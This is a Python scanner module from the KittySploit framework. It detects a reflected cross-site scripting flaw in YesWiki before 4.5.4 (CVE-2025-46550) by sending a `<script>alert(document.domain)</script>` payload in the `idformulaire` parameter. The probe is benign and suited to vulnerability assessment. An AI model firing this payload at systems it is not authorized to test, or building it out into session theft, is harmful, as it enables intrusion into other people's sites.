#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""YesWiki < 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'YesWiki < 4.5.4 - Cross-Site Scripting Detection',
        'description': 'YesWiki < 4.5.4 contains a reflected cross-site scripting caused by unsanitized `idformulaire` parameter in `/?BazaR` endpoint, letting attackers steal cookies and hijack sessions, exploit requires user to click malicious link.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'xss', 'yeswiki', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/YesWiki/yeswiki/security/advisories/GHSA-ggqx-43h2-55jp',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-46550',
        ],
        'cve': 'CVE-2025-46550',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?BazaR&vue=formulaire&action=confirm_delete&idformulaire=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('<script>alert(document.domain)</script>', 'yeswiki',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="YesWiki < 4.5.4 - Cross-Site Scripting detected",
                path='/?BazaR&vue=formulaire&action=confirm_delete&idformulaire=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E',
            )
            return True
        return False

